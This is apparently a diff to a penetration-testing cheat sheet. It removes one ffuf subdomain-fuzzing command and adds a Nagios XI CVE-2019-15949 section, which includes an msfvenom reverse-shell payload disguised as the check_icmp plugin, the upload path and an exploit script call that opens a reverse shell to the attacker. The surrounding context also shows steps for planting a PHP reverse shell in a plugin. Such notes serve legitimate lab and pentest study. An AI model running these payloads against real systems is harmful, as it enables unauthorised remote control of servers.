@@ -36,10 +36,6 @@ Always try multiple scan speeds and script combinations.
   ```bash
   ffuf -u http://[DOMAIN] -H "Host: FUZZ.[DOMAIN]" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
   ```
-  - **Subdomain Fuzzing:**
-  ```bash
-  ffuf -u http://FUZZ.192.168.171.136/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
-  ```
 - **Extension Brute Force:**
   ```bash
   ffuf -u http://10.10.10.10/FUZZ -w list.txt -e .php,.txt,.bak,.old
@@ -279,6 +275,16 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   3. Inject a PHP Reverse Shell.
   4. Zip the modified folder and upload/install it.
   5. Trigger by visiting the plugin's path or its "About/Settings" page.
+
+### Nagios XI Specific (CVE-2019-15949)
+- **Scenario**: Authenticated access to Nagios XI.
+- **Exploit Logic**: Upload malicious plugin via the "Manage Plugins" administrative interface.
+- **Manual Exploitation**:
+  1. Generate Payload: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[PORT] -f elf -o check_icmp`
+  2. Upload at: `http://[IP]/nagiosxi/admin/monitoringplugins.php`
+  3. Execute: Trigger the plugin through the Monitoring interface or specific script calls.
+- **Root RCE Script (Misc/Post-Exp)**:
+  `php exploit.php --host=[IP] --user=[USER] --pass=[PASS] --reverseip=[KALI_IP] --reverseport=[PORT]`
 
 ### SQL Injection & MSSQL
 - **Sqlmap (Automated):**
@@ -604,4 +610,3 @@ Include multiple variations for different OS targets and filtering environments.
 
 ---
 **Final Word:** Keep your shells stable, your enumeration deep, and don't panic. If one door is locked, check the window! 🚀
-
